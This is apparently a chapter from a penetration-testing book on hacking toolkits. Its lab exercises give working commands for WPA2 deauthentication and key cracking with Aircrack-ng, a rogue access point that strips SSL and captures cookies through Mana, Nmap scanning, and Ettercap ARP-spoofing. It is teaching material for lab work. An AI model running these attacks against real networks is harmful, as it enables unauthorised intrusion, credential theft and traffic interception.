<html><head></head><body>
<div id="page" style="height:0pt"/><div class="book" title="Chapter&#xA0;6.&#xA0;Exploring Hacking Toolkits"><div class="book" id="181NK2-3ecab517ca6e4afbb3c20ab15f7b4d82"><div class="book"><div class="book"><h1 class="title" id="calibre_pb_0"><a id="ch06" class="calibre1"/>Chapter 6. Exploring Hacking Toolkits</h1></div></div></div><p class="calibre9">As you probably know, hackers and penetration testers use not only small standalone utilities in their work, but also (probably more often) various sets of security tools and whole OS distributions built for penetration testing and filled with necessary tools.</p><p class="calibre9">In the course of this chapter, we are going to review toolkits, frameworks, and distributions and provide examples of their utilization in our lab environment in order to familiarize you with them and help you choose the toolkits you would like to learn in more depth for your tasks.</p><p class="calibre9">In this chapter, we are going to cover the following topics:</p><div class="book"><ul class="itemizedlist"><li class="listitem">Wireless hacking tools</li><li class="listitem">Infrastructure hacking tools</li><li class="listitem">Cracking tools</li><li class="listitem">Web application hacking tools</li></ul></div></div>

<div class="book" title="Chapter&#xA0;6.&#xA0;Exploring Hacking Toolkits">
<div class="book" title="Wireless hacking tools"><div class="book"><div class="book"><div class="book"><h1 class="title" id="calibre_pb_1"><a id="ch06lvl1sec35" class="calibre1"/>Wireless hacking tools</h1></div></div></div><p class="calibre9">Logically following<a id="id378" class="calibre1"/> our assertion that our book is about creating a lab for wireless networks, we are going to start reviewing penetration testing frameworks and toolkits with a topic dedicated to wireless hacking.</p></div></div>

<div class="book" title="Chapter&#xA0;6.&#xA0;Exploring Hacking Toolkits">
<div class="book" title="Wireless hacking tools">
<div class="book" title="Aircrack-ng"><div class="book"><div class="book"><div class="book"><h2 class="title1" id="calibre_pb_2"><a id="ch06lvl2sec59" class="calibre1"/>Aircrack-ng</h2></div></div></div><p class="calibre9">When<a id="id379" class="calibre1"/> we <a id="id380" class="calibre1"/>talk about an approach and tools for Wi-Fi hacking, the first thing that comes in our minds is Aircrack-ng (<a class="calibre1" href="http://www.aircrack-ng.org">http://www.aircrack-ng.org</a>). Although <a id="id381" class="calibre1"/>there is a standalone tool for cracking WEP, WPA, and WPA2 security with the same name, the whole set of tools is called Aircrack-ng and the cracking tool is included in this set among the others.</p><p class="calibre9">We will not exaggerate by saying that Aircrack-ng is our favorite and the must-use toolkit in Wi-Fi penetration testing projects, though we do not always use all of the tools included in it.</p><p class="calibre9">The toolkit is <a id="id382" class="calibre1"/>primarily developed for Linux and command line usage and despite the fact that it can also be used under Windows, we would recommend to use it only under <code class="literal">*nix</code>-like systems because there are a lot of limitations under Windows.</p><p class="calibre9">There are three ways of <a id="id383" class="calibre1"/>using Aircrack-ng:</p><div class="book"><ul class="itemizedlist"><li class="listitem">Installing Aircrack-ng on your Linux host from source code or with a package manager, for example, on a Debian-like system (it is already preinstalled in penetration testing distributions like Kali Linux):<div class="informalexample"><pre class="programlisting">
<span class="strong"><strong class="calibre2">apt-get install airckrack-ng</strong></span>
</pre></div></li><li class="listitem">Booting from a live CD with Aircrack-ng installed</li><li class="listitem">Downloading a VMware VM image with Aircrack-ng installed</li></ul></div><div class="book" title="Content"><div class="book"><div class="book"><div class="book"><h3 class="title2"><a id="ch06lvl3sec37" class="calibre1"/>Content</h3></div></div></div><p class="calibre9">The following<a id="id384" class="calibre1"/> list shows you the tools of this the framework and provides you with a short description of each:</p><div class="book"><ul class="itemizedlist"><li class="listitem"><span class="strong"><strong class="calibre2">Airbase-ng</strong></span>: This<a id="id385" class="calibre1"/> tool is used to create software APs and attack wireless clients.</li><li class="listitem"><span class="strong"><strong class="calibre2">Aircrack-ng</strong></span>: This<a id="id386" class="calibre1"/> is actually the cracking tool for WEP and WPA/WPA2 key recovery.</li><li class="listitem"><span class="strong"><strong class="calibre2">Airdecap-ng</strong></span>: This <a id="id387" class="calibre1"/>is used for decrypting WEP and WPA/WPA2 wireless traffic.</li><li class="listitem"><span class="strong"><strong class="calibre2">Airdecloak-ng</strong></span>: This<a id="id388" class="calibre1"/> tool is used for beating WEP cloaking, a method used in WEP to fool cracking tools.</li><li class="listitem"><span class="strong"><strong class="calibre2">Aireplay-ng</strong></span>: This <a id="id389" class="calibre1"/>generates supplementary wireless traffic to allow performing various attack types.</li><li class="listitem"><span class="strong"><strong class="calibre2">Airmon-ng</strong></span>: This <a id="id390" class="calibre1"/>switches a wireless interface into monitor mode, which allows low-level wireless traffic manipulations.</li><li class="listitem"><span class="strong"><strong class="calibre2">Airodump-ng</strong></span>: This<a id="id391" class="calibre1"/> tool is used for 802.11 monitoring and sniffing.</li><li class="listitem"><span class="strong"><strong class="calibre2">Airodump-ng-oui-update</strong></span>: As<a id="id392" class="calibre1"/> suggested by the name, this tool is used to update the <a id="id393" class="calibre1"/><span class="strong"><strong class="calibre2">Organizationally Unique Identifier</strong></span> (<span class="strong"><strong class="calibre2">OUI</strong></span>) database of Airodump-ng.</li><li class="listitem"><span class="strong"><strong class="calibre2">Airolib-ng</strong></span>: This <a id="id394" class="calibre1"/>tool is useful for maintaining a local database of ESSIDs, passphrases and precomputed PMKs to use in cracking (the idea is very similar to using rainbow tables).</li><li class="listitem"><span class="strong"><strong class="calibre2">Airserv-ng</strong></span>: This<a id="id395" class="calibre1"/> allows multiple applications to access the Wi-Fi interface via TCP connections as a server.</li><li class="listitem"><span class="strong"><strong class="calibre2">Airtun-ng</strong></span>: This <a id="id396" class="calibre1"/>is the tool for creating virtual tunnel interfaces.</li><li class="listitem"><span class="strong"><strong class="calibre2">Besside-ng</strong></span>: This <a id="id397" class="calibre1"/>is the automated WEP and WPA attacking tool to crack all reachable WEP-protected networks and record all available WPA-handshakes.</li><li class="listitem"><span class="strong"><strong class="calibre2">Easside-ng</strong></span>: This<a id="id398" class="calibre1"/> tool allows us to communicate via an WEP-protected AP without a WEP-key.</li><li class="listitem"><span class="strong"><strong class="calibre2">Packetforge-ng</strong></span>: As<a id="id399" class="calibre1"/> its name suggests, this tool is used to create forged wireless packets used in other attacks.</li><li class="listitem"><span class="strong"><strong class="calibre2">Tkiptun-ng</strong></span>: As<a id="id400" class="calibre1"/> per the official documentation, this tool is very useful:<div class="blockquote"><blockquote class="blockquote1"><p class="calibre25">This tool is able to inject a few frames into a WPA TKIP network with QoS.</p></blockquote></div><p class="calibre27">But the authors of this book have not used it yet and are not sure if this tool is released or is still under development.</p></li><li class="listitem"><span class="strong"><strong class="calibre2">Wesside-ng</strong></span>: This <a id="id401" class="calibre1"/>is the automated WEP-attacking tool for cracking all reachable WEP-protected networks without user interaction.</li></ul></div><div class="informalexample" title="Note"><h3 class="title2"><a id="note24" class="calibre1"/>Note</h3><p class="calibre9">For a detailed description of the tools and their documentation, refer to the official Aircrack-ng website (<a class="calibre1" href="http://www.aircrack-ng.org/">http://www.aircrack-ng.org/</a>).</p></div></div><div class="book" title="Exercise"><div class="book"><div class="book"><div class="book"><h3 class="title2"><a id="ch06lvl3sec38" class="calibre1"/>Exercise</h3></div></div></div><p class="calibre9">Let's complete a short exercise<a id="id402" class="calibre1"/> with Aircrack-ng utilization under Linux. As an example, we will crack a WPA2 key:</p><div class="book"><ol class="orderedlist"><li class="listitem" value="1">As the very first step in a Wi-Fi penetration test, we need to switch our Wi-Fi-interface into a promiscuous monitor mode to allow the system to "hear" all the Wi-Fi packets and allow it to inject wireless traffic working on a low-level interface level. Assuming that our wireless interface is <code class="literal">wlan1</code>, it can be done with the <code class="literal">airmon-ng</code> utility as follows:<div class="informalexample"><pre class="programlisting">
<span class="strong"><strong class="calibre2">airmon-ng start wlan1</strong></span>
</pre></div><p class="calibre27">After that, we can see the report that the interface is turned into the monitor mode:</p><div class="mediaobject"><img src="../images/00050.jpeg" alt="Exercise" class="calibre11"/></div><p class="calibre26"> </p></li><li class="listitem" value="2">The<a id="id403" class="calibre1"/> preceding command turns the wireless interface into a monitor mode and creates a virtual interface <code class="literal">wlan1mon</code>, which we will use in the next steps. You can see that <code class="literal">airmon-ng</code> warns you about possible conflicts with some processes and provides you a list of them. If you want to quickly kill all those processes, just execute the following command:<div class="informalexample"><pre class="programlisting">
<span class="strong"><strong class="calibre2">airmon-ng check kill</strong></span>
</pre></div></li><li class="listitem" value="3">Now, let's listen to the air to find out what do we have around and choose a target. It can be done with the <code class="literal">airodump-ng</code> tool with the monitoring virtual interface's name as a parameter:<div class="informalexample"><pre class="programlisting">
<span class="strong"><strong class="calibre2">airodump-ng wlan1mon</strong></span>
</pre></div><p class="calibre27">Let the tool work for a while (5 minutes should be enough) and you can see two tables, updated in a real-time mode. Check out the following screenshot:</p><div class="mediaobject"><img src="../images/00051.jpeg" alt="Exercise" class="calibre11"/></div><p class="calibre26"> </p></li><li class="listitem" value="4">You <a id="id404" class="calibre1"/>can see both our lab WLANs along with their security types in the first table which lists accessible APs. So, let's attack the guest WLAN as we own this network and do not need any additional permission to attack.</li><li class="listitem" value="5">We need to obtain a WPA handshake to crack it and a handshake can be sniffed by just passively waiting for a device establishing a connection with the AP. But to extend our example and show you how the <code class="literal">aireplay-ng</code> tool works, we are going to use an active attack in order to force a device, already connected to the WLAN, to disconnect and try to connect again.</li><li class="listitem" value="6">To perform a targeted attack, we need to restart <code class="literal">airodump-ng</code> with more parameters in order to sniff only the communications of our Guest WLAN. The parameters are target BSSID, target Wi-Fi channel, and the capture filename. Values for the first two parameters come from the first <code class="literal">airodump-ng</code> capture:<div class="informalexample"><pre class="programlisting">
<span class="strong"><strong class="calibre2">airodump-ng --bssid 68:B6:FC:15:27:18 --channel 11 --write guest_dump wlan1mon</strong></span>
</pre></div><p class="calibre27">In the result, you'll get a much cleaner output that shows the information about only the target WLAN, as shown in the following screenshot:</p><div class="mediaobject"><img src="../images/00052.jpeg" alt="Exercise" class="calibre11"/></div><p class="calibre26"> </p></li><li class="listitem" value="7">When <code class="literal">airodump-ng</code> is not jumping from channel to channel, it can better detect <a id="id405" class="calibre1"/>associated clients. We need to choose a device associated with the AP and perform a deauthentication attack on it using <code class="literal">aireplay-ng</code> on behalf of the AP (forgery). Let's attack a client with the hardware address <code class="literal">C8:F7:33:0E:73:38</code> from the preceding screenshot. Open a new terminal window and execute the following command:<div class="informalexample"><pre class="programlisting">
<span class="strong"><strong class="calibre2">aireplay-ng --deauth 5 -a 68:B6:FC:15:27:18 -c F8:A9:D0:65:50:B6 wlan1mon</strong></span>
</pre></div><p class="calibre27">In the following screenshot, you can see <code class="literal">aireplay-ng</code> performing the attack and <code class="literal">airodump-ng</code> capturing a WPA-handshake from a client, that is trying to re-authenticate:</p><div class="mediaobject"><img src="../images/00053.jpeg" alt="Exercise" class="calibre11"/></div><p class="calibre26"> </p><p class="calibre27">Alternatively, you can do it less gently and perform a broadcast deauthentication attack to all associated clients with the command:</p><div class="informalexample"><pre class="programlisting">
<span class="strong"><strong class="calibre2">aireplay-ng --deauth 5 -a 68:B6:FC:15:27:18 wlan1mon</strong></span>
</pre></div></li><li class="listitem" value="8">If the <a id="id406" class="calibre1"/>device is configured to automatically reconnect to the WLAN, we will be able to capture the next WPA-handshake and see the corresponding message in the top right corner of the <code class="literal">airodump-ng</code> terminal.</li><li class="listitem" value="9">Now let's create a short wordlist and add our guest WLAN PSK there.</li><li class="listitem" value="10">After that, just start the <code class="literal">aircrack-ng</code> tool with the dump file and the wordlist as parameters:<div class="informalexample"><pre class="programlisting">
<span class="strong"><strong class="calibre2">aircrack-ng guest_dump-01.cap -w wordlist.txt</strong></span>
</pre></div><p class="calibre27">Cracking time can vary depending on the size of your wordlist, but if the correct PSK is in the wordlist, it will be found and displayed to you as shown on the following screenshot:</p><div class="mediaobject"><img src="../images/00054.jpeg" alt="Exercise" class="calibre11"/></div><p class="calibre26"> </p></li></ol><div class="calibre14"/></div><p class="calibre9">At this point, you<a id="id407" class="calibre1"/> can connect to the WLAN using the recovered PSK and the WLAN's security is bypassed.</p></div></div></div></div>

<div class="book" title="Chapter&#xA0;6.&#xA0;Exploring Hacking Toolkits">
<div class="book" title="Wireless hacking tools">
<div class="book" title="Mana"><div class="book"><div class="book"><div class="book"><h2 class="title1" id="calibre_pb_3"><a id="ch06lvl2sec60" class="calibre1"/>Mana</h2></div></div></div><p class="calibre9">Mana is <a id="id408" class="calibre1"/>another interesting Wi-Fi penetration testing toolkit mainly aimed towards attacking wireless clients rather than wireless networks. It can perform man-in-the-middle attacks with a rogue access point and harvest credentials with fake Internet.</p><p class="calibre9">Mana is a Linux <a id="id409" class="calibre1"/>toolkit based on a modified version of Hostapd software (used to create software access points) and contains the following <a id="id410" class="calibre1"/>start scripts for launching Mana in various attacks modes (the description is taken from the original readme file):</p><div class="book"><ul class="itemizedlist"><li class="listitem"><code class="literal">start-nat-full.sh</code>: This <a id="id411" class="calibre1"/>will fire up MANA in NAT mode (you'll need an upstream link) with all the MitM bells and whistles.</li><li class="listitem"><code class="literal">start-nat-simple.sh</code>: This <a id="id412" class="calibre1"/>will fire up MANA in NAT mode, but without any of <code class="literal">firelamb</code>, <code class="literal">sslstrip</code>, <code class="literal">sslsplit</code>, and so on.</li><li class="listitem"><code class="literal">start-noupstream.sh</code>: This <a id="id413" class="calibre1"/>will start MANA in a "fake Internet" mode. This is useful for places where people leave their Wi-Fi on, but there is no upstream Internet. Also contains the captive portal.</li><li class="listitem"><code class="literal">start-noupstream-eap.sh</code>: This<a id="id414" class="calibre1"/> will start MANA with the EAP attack and <code class="literal">noupstream</code> mode.</li></ul></div><p class="calibre9">The Mana toolkit can be <a id="id415" class="calibre1"/>downloaded and installed in three ways:</p><div class="book"><ul class="itemizedlist"><li class="listitem">From the Git repository <a class="calibre1" href="https://github.com/sensepost/mana">https://github.com/sensepost/mana</a> (<code class="literal">git clone + make install</code>)</li><li class="listitem">By starting one of the scripts <code class="literal">ubuntu-install.sh</code> or <code class="literal">kali-install.sh</code> from Mana archive</li><li class="listitem">Using <code class="literal">apt-get</code>: <code class="literal">apt-get install mana-toolkit</code></li></ul></div><p class="calibre9">After installation, the Mana software can be found in <code class="literal">/usr/share/mana-toolkit/</code> and its configuration files can be found in <code class="literal">/etc/mana-toolkit/</code>.</p><div class="book" title="Exercise"><div class="book"><div class="book"><div class="book"><h3 class="title2"><a id="ch06lvl3sec39" class="calibre1"/>Exercise</h3></div></div></div><p class="calibre9">Let's set up an <a id="id416" class="calibre1"/>evil AP with Mana toolkit in order to attempt to sniff client traffic:</p><div class="book"><ol class="orderedlist"><li class="listitem" value="1">Install the Mana toolkit on your Linux attacker machine if you have not done it yet.</li><li class="listitem" value="2">Connect a wireless interface to the attacker machine and find out its name with the <code class="literal">iwconfig</code> command:<div class="informalexample"><pre class="programlisting">
<span class="strong"><strong class="calibre2">iwconfig</strong></span>
</pre></div><p class="calibre27">From the command output, we can see that (in our case) it is <code class="literal">wlan1</code>:</p><div class="informalexample"><pre class="programlisting">
<span class="strong"><strong class="calibre2">eth0      no wireless extensions.</strong></span>
<span class="strong"><strong class="calibre2">lo        no wireless extensions.</strong></span>
<span class="strong"><strong class="calibre2">wlan1     IEEE 802.11bgn  ESSID:off/any  </strong></span>
<span class="strong"><strong class="calibre2">          Mode:Managed  Access Point: Not-Associated   Tx-Power=0 dBm   </strong></span>
<span class="strong"><strong class="calibre2">          Retry short limit:7   RTS thr=2347 B   Fragment thr:off</strong></span>
<span class="strong"><strong class="calibre2">          Encryption key:off</strong></span>
<span class="strong"><strong class="calibre2">          Power Management:on</strong></span>
</pre></div><p class="calibre27">Now, we need to adjust the script that we are going to utilize and the corresponding config files. We are going to use <code class="literal">start-nat-full.sh</code>. Open the script file in editor and change the value of the <code class="literal">phy</code> parameter to the name of your Wi-Fi interface (<code class="literal">wlan1</code> in our case).</p></li><li class="listitem" value="3">The corresponding config file name can be found in the beginning of the script and it is <code class="literal">/etc/mana-toolkit/hostapd-karma.conf</code>. You also need to check if the values of the parameters <code class="literal">interface</code> and <code class="literal">driver</code> correspond to your Wi-Fi interface.</li><li class="listitem" value="4">Now, just<a id="id417" class="calibre1"/> run the script and Mana will set up a rogue AP with all the necessary tools needed to imitate a Wi-Fi hotspot offering free Internet access and logging client traffic.</li><li class="listitem" value="5">Check if an EvilAP was successfully created. Open available wireless networks and see if <span class="strong"><strong class="calibre2">Internet</strong></span> (or your evil SSID if you have changed it in the config file) is among them:<div class="mediaobject"><img src="../images/00055.jpeg" alt="Exercise" class="calibre11"/></div><p class="calibre26"> </p></li><li class="listitem" value="6">Connect to the evil WLAN from another host and try to visit various websites. You should see the victim's connections data and attack details in the terminal:<div class="mediaobject"><img src="../images/00056.jpeg" alt="Exercise" class="calibre11"/></div><p class="calibre26"> </p></li><li class="listitem" value="7">Mana<a id="id418" class="calibre1"/> automatically tries to perform man-in-the-middle attacks for SSL and forces web connections to work via HTTP instead of HTTPS using the <code class="literal">sslstrip</code> tool. You can find gathered information in <code class="literal">/var/lib/mana-toolkit/</code>.</li><li class="listitem" value="8">Mana also uses the tool Firelamb to capture victims' cookies. You can see all the captured cookies with the <code class="literal">/usr/share/mana-toolkit/run-mana/firelamb-view.sh</code> script. The tool will even open browser sessions with intercepted cookies for you:<div class="mediaobject"><img src="../images/00057.jpeg" alt="Exercise" class="calibre11"/></div><p class="calibre26"> </p></li></ol><div class="calibre14"/></div></div></div></div></div>

<div id="page" style="height:0pt"/><div class="book" title="Infrastructure hacking tools"><div class="book" id="190862-3ecab517ca6e4afbb3c20ab15f7b4d82"><div class="book"><div class="book"><h1 class="title" id="calibre_pb_0"><a id="ch06lvl1sec36" class="calibre1"/>Infrastructure hacking tools</h1></div></div></div><p class="calibre9">Infrastructure hacking<a id="id419" class="calibre1"/> is such a broad topic including so many subtopics that each of them could be distinguished into a separate huge security domain. Therefore, there are so many hacking toolsets, frameworks, and software packs for various tasks and scenarios that it would need a whole book to describe all of them. Instead of that, we are going to just review probably the most popular, free, and well-known hacking tool <a id="id420" class="calibre1"/>and framework <span class="strong"><strong class="calibre2">Metasploit Framework</strong></span> (also known as <span class="strong"><strong class="calibre2">MSF</strong></span>) maintained by the company Rapid7.</p></div>

<div class="book" title="Infrastructure hacking tools">
<div class="book" title="Nmap"><div class="book"><div class="book"><div class="book"><h2 class="title1" id="calibre_pb_1"><a id="ch06lvl2sec61" class="calibre1"/>Nmap</h2></div></div></div><p class="calibre9">Nmap is<a id="id421" class="calibre1"/> the most popular network security tool used by <a id="id422" class="calibre1"/>hackers and pentesters (and our favorite). This is an excellent tool for discovery and enumeration of available live hosts, open ports and network services, and much more. It can be used for security checks, to determine a service running on the host, to identify the OS and applications, and even to determine the type of firewall used on a scanned node.</p><p class="calibre9">The source code and binaries of Nmap are available at <a id="id423" class="calibre1"/>the official website (<a class="calibre1" href="http://nmap.org/download.html">http://nmap.org/download.html</a>). A Windows version is also available. If you are using Linux, you can find Nmap packages in the repositories for most distributions. For example, in Debian Linux, you can type the following command in the console:</p><div class="informalexample"><pre class="programlisting">
<span class="strong"><strong class="calibre2">apt-get install nmap</strong></span>
</pre></div><p class="calibre9">After a few seconds, you'll have a ready binary on your system.</p><p class="calibre9">Nmap is a console application, but before we talk about work in the console, it should be noted that there is a GUI for Nmap that you can use to input commands and run scan tasks. It is Zenmap. Zenmap allows you to select targets, run scan tasks, display results, save results, and compare results with others.</p><p class="calibre9">GUI Zenmap is a good way to get acquainted with Nmap, but it is better to know how to use Nmap in the console with command line arguments if you're going to work with it efficiently.</p><p class="calibre9">The Nmap command line<a id="id424" class="calibre1"/> has the following syntax:</p><p class="calibre9">
<code class="literal">nmap [Scan Type(s)] [Options] {target specification}</code>
</p><p class="calibre9">The definitions for the terms are as follows:</p><div class="book"><ul class="itemizedlist"><li class="listitem"><code class="literal">Scan Type</code>: This is a technique of scanning. It can be a simple ping scan (<code class="literal">-sn</code>), TCP ACK scan (<code class="literal">-sS</code>), UDP scan (<code class="literal">-sU</code>), exotic Xmas scan (<code class="literal">-sX</code>), or TCP Null scan (<code class="literal">-sN</code>) for trying firewall bypass. Nmap is not limited to these techniques and there are others as well. You can get the full list by executing Nmap help:<div class="informalexample"><pre class="programlisting">
<span class="strong"><strong class="calibre2">nmap -h</strong></span>
</pre></div></li><li class="listitem"><code class="literal">Options</code>: This is a set of scan parameters. The full description of Nmap options is more than 100 pages long. Thus, we are providing only a few examples here:<div class="book"><ul class="itemizedlist1"><li class="listitem">The ports to scan (<code class="literal">-p</code>)</li><li class="listitem">Probe open ports to determine service/version info (<code class="literal">-sV</code>)</li><li class="listitem">Resolve DNS name of target hosts or not</li><li class="listitem">Enable OS detection (<code class="literal">-O</code>)</li><li class="listitem">Firewall/IDS evasion and spoofing techniques</li><li class="listitem">Output parameters (Nmap has three basic output formats: Normal, XML, and Grepable format; this gives greater freedom in processing of the results)</li></ul></div></li><li class="listitem"><code class="literal">target specification</code>: This is the parameter where we set our targets. The user can set the target address by typing it as a parameter of an execution command or as a file (using the option <code class="literal">-iL</code>), where each line is a host address.</li></ul></div><p class="calibre9">Most of the <a id="id425" class="calibre1"/>options can be combined with each other. Some options are for selecting a scan method, while others point to the use of additional features or are used to adjust various settings for scanning. Nmap warns the user about an invalid combination of options. As mentioned earlier, for a brief overview of all options, you should run Nmap with the <code class="literal">-h</code> parameter.</p><p class="calibre9">For the detailed list of options, you can refer to the home page of Nmap (<a class="calibre1" href="https://nmap.org/book/man-briefoptions.html">https://nmap.org/book/man-briefoptions.html</a>) or use the <code class="literal">man</code> command on Linux:</p><div class="informalexample"><pre class="programlisting">
<span class="strong"><strong class="calibre2">man nmap</strong></span>
</pre></div><p class="calibre9">Nmap is a very powerful tool that provides a lot of information such as the operating system running on the target host, open ports, MAC address of the device, and so on depending on the scan options and the target itself.</p><div class="book" title="Scripting engine"><div class="book"><div class="book"><div class="book"><h3 class="title2"><a id="ch06lvl3sec40" class="calibre1"/>Scripting engine</h3></div></div></div><p class="calibre9">At the <a id="id426" class="calibre1"/>completion of the review of this great software, we will consider why many experts call Nmap a Swiss army knife. <span class="strong"><strong class="calibre2">Nmap Scripting Engine</strong></span> (<span class="strong"><strong class="calibre2">NSE</strong></span>) is a result <a id="id427" class="calibre1"/>of the decision to empower Nmap by writing additional functionality in the language LUA.</p><p class="calibre9">To use the scripts, it needs to use the <code class="literal">--script</code> key with the name of the script as a parameter <code class="literal">(--script=&lt;script name&gt;</code>).</p><p class="calibre9">Currently, there is a huge variety of readymade scripts included in the Nmap distribution package, which can be used for the following purposes:</p><div class="book"><ul class="itemizedlist"><li class="listitem">Information gathering</li><li class="listitem">Deep hosts and network services discovery</li><li class="listitem">Authentication processes checks</li><li class="listitem">Bruteforce attacks such as password guessing</li><li class="listitem">DoS attacks</li><li class="listitem">Vulnerability identification</li><li class="listitem">Exploitation of vulnerabilities</li></ul></div><p class="calibre9">The full list of the available scripts and descriptions can be found at <a class="calibre1" href="http://nmap.org/nsedoc">http://nmap.org/nsedoc</a>.</p><p class="calibre9">If the functionality<a id="id428" class="calibre1"/> you need is not there in the standard package, you can write your own scripts to fit your needs.</p></div><div class="book" title="Example"><div class="book"><div class="book"><div class="book"><h3 class="title2"><a id="ch06lvl3sec41" class="calibre1"/>Example</h3></div></div></div><p class="calibre9">Now, we would like<a id="id429" class="calibre1"/> to show you the power of Nmap. For demonstration purposes, we are going to scan a Windows 7 machine in our user network segment. The machine has MS SQL Express and MS IIS7.5 servers installed, while its Windows Firewall is turned off. For this, we execute the following command:</p><div class="informalexample"><pre class="programlisting">
<span class="strong"><strong class="calibre2">nmap -sS -sV -O -sC -T4 --traceroute 172.16.0.102</strong></span>
</pre></div><p class="calibre9">Here, we use:</p><div class="book"><ul class="itemizedlist"><li class="listitem"><code class="literal">-sS</code>: This is used for TCP Syn scan</li><li class="listitem"><code class="literal">-sV</code>: This is used for determination of the network service version of open ports (this is a very "noisy" option)</li><li class="listitem"><code class="literal">-O</code>: This is used for detecting the OS version</li><li class="listitem"><code class="literal">-sC</code>: This is equivalent to <code class="literal">--script=default</code>, that is, all scripts of the <span class="strong"><strong class="calibre2">Default</strong></span> category</li><li class="listitem"><code class="literal">-T4</code>: This is used for setting the fast timing template</li><li class="listitem"><code class="literal">172.16.0.102</code>: This is the IP address of our target</li></ul></div><p class="calibre9">After a couple of minutes, we will get the following result:</p><div class="mediaobject"><img src="../images/00058.jpeg" alt="Example" class="calibre11"/></div><p class="calibre12"> </p><p class="calibre9">As you can see, the <a id="id430" class="calibre1"/>output is sufficiently detailed and clear.</p><div class="informalexample" title="Note"><h3 class="title2"><a id="note25" class="calibre1"/>Note</h3><p class="calibre9">Nmap author <span class="strong"><em class="calibre10">Gordon "Fyodor" Lyon</em></span> wrote the book <span class="strong"><em class="calibre10">Nmap Network Scanning: The Official Nmap Project Guide to Network Discovery and Security Scanning</em></span>, <span class="strong"><em class="calibre10">Nmap Project</em></span>. If you want to get the full power of Nmap, we strongly recommend that you read it. It is available on Amazon (<a class="calibre1" href="http://www.amazon.com/dp/0979958717?tag=secbks-20">http://www.amazon.com/dp/0979958717?tag=secbks-20</a>).</p></div></div></div></div>

<div class="book" title="Infrastructure hacking tools">
<div class="book" title="Ettercap"><div class="book"><div class="book"><div class="book"><h2 class="title1" id="calibre_pb_2"><a id="ch06lvl2sec62" class="calibre1"/>Ettercap</h2></div></div></div><p class="calibre9">In the course<a id="id431" class="calibre1"/> of hacking network infrastructure, <span class="strong"><strong class="calibre2">man-in-the-middle</strong></span> (<span class="strong"><strong class="calibre2">MitM</strong></span>) type attacks <a id="id432" class="calibre1"/>are <a id="id433" class="calibre1"/>often used. Such attacks are usually as easy to perform as they are easy to identify, because they are very "noisy" due to the large amount of auxiliary traffic they generate. But as a result, you can get a lot of useful information and get the possibility to manage a victim.</p><p class="calibre9">There are a<a id="id434" class="calibre1"/> lot of tools for MitM attack execution. For operating systems of the Microsoft Windows family, the most popular ones are Cain (<a class="calibre1" href="http://www.oxid.it/cain.html">http://www.oxid.it/cain.html</a>) and Intercepter-NG (<a class="calibre1" href="http://sniff.su/">http://sniff.su/</a>). They have a simple graphical user interface and rich features. The execution of the attack is reduced to a few mouse clicks. Another similar tool worth mentioning is a multiplatform tool <a id="id435" class="calibre1"/>Bettercap (<a class="calibre1" href="https://www.bettercap.org/">https://www.bettercap.org/</a>).</p><p class="calibre9">As a classic and one of our favorite tools for performing MitM attacks (especially for ARP-spoofing), we are<a id="id436" class="calibre1"/> going to review Ettercap (<a class="calibre1" href="http://ettercap.github.io/ettercap/">http://ettercap.github.io/ettercap/</a>).</p><p class="calibre9">Ettercap is a tool to analyze the security of the network, which has a wide variety of features, such as listening to network traffic, content filtering, and more for analysis of networks and hosts.</p><p class="calibre9">Ettercap supports different protocols (Telnet, FTP, POP3, IMAP, SMB, HTTP, and many others) and can be used for:</p><div class="book"><ul class="itemizedlist"><li class="listitem">OS fingerprinting</li><li class="listitem">Resetting network connections</li><li class="listitem">Filtering network traffic based on a set of parameters</li><li class="listitem">Performing spoofing-attacks of various protocols, such as DNS</li></ul></div><p class="calibre9">The complete list of possibilities is much greater. Ettercap has many features and expands due to the large number of plugins.</p><p class="calibre9">In the result of the attack, obtained data can be viewed online (for example, if there were passwords in the network traffic, they would be shown immediately) and stored in a file.</p><p class="calibre9">The installation package of Ettercap is available on the official website (<a class="calibre1" href="https://ettercap.github.io/ettercap/downloads.html">https://ettercap.github.io/ettercap/downloads.html</a>), where you can download it.</p><p class="calibre9">Ettercap is a Linux software, so it has a convenient console management with all the consequences. But it also has a graphical user interface. To run in graphical mode, you should execute Ettercap with the <code class="literal">-G</code> key.</p><div class="mediaobject"><img src="../images/00059.jpeg" alt="Ettercap" class="calibre11"/></div><p class="calibre12"> </p><p class="calibre9">So let's try Ettercap.</p><div class="book" title="Exercise"><div class="book"><div class="book"><div class="book"><h3 class="title2"><a id="ch06lvl3sec42" class="calibre1"/>Exercise</h3></div></div></div><p class="calibre9">Now let's <a id="id437" class="calibre1"/>try to start Ettercap in a couple of modes to see what it looks like:</p><div class="book"><ol class="orderedlist"><li class="listitem" value="1">To start Ettercap in the sniffing mode, we should execute the Ettercap binary file specifying the network interface to work with (<code class="literal">-i eth0</code> or <code class="literal">-iface eth0</code> in our example) and one of the following keys to determine the type of user interface:<div class="book"><ul class="itemizedlist1"><li class="listitem"><code class="literal">-T</code> (<code class="literal">--text</code>): This key uses text only GUI</li><li class="listitem"><code class="literal">-C</code> (<code class="literal">--curses</code>): This key uses curses GUI</li><li class="listitem"><code class="literal">-D</code> (<code class="literal">--daemon</code>): This key daemonizes Ettercap (no GUI)</li><li class="listitem"><code class="literal">-G</code> (<code class="literal">--gtk</code>): This key uses GTK with GUI<div class="informalexample"><pre class="programlisting">
<span class="strong"><strong class="calibre2">ettercap --text --iface eth0</strong></span>
</pre></div></li></ul></div><p class="calibre27">The following command starts Ettercap in a sniffer mode:</p><p class="calibre27">You should see an output similar to the following:</p><div class="mediaobject"><img src="../images/00060.jpeg" alt="Exercise" class="calibre11"/></div><p class="calibre26"> </p></li><li class="listitem" value="2">As you <a id="id438" class="calibre1"/>can see, Ettercap's output is also very informative like Nmap's output. Just press <span class="strong"><em class="calibre10">q</em></span> when you want to stop Ettercap and it reports if it was terminated correctly:<div class="informalexample"><pre class="programlisting">
<span class="strong"><strong class="calibre2">Terminating ettercap...</strong></span>
<span class="strong"><strong class="calibre2">Lua cleanup complete!</strong></span>
<span class="strong"><strong class="calibre2">Unified sniffing was stopped.</strong></span>
</pre></div></li><li class="listitem" value="3">Ettercap has acquired its popularity for the opportunity to perform ARP-spoofing attacks. Let's assume that we want to use Ettercap to intercept traffic (man-in-the-middle attack) between a workstation which connects to a web interface on another workstation. Here's an example of using Ettercap to perform an ARP-spoofing MitM attack:<div class="informalexample"><pre class="programlisting">
<span class="strong"><strong class="calibre2">ettercap -text --iface eth0 --write traffic.pcap --mitm arp:remote /172.16.0.91/ /172.16.0.102/</strong></span>
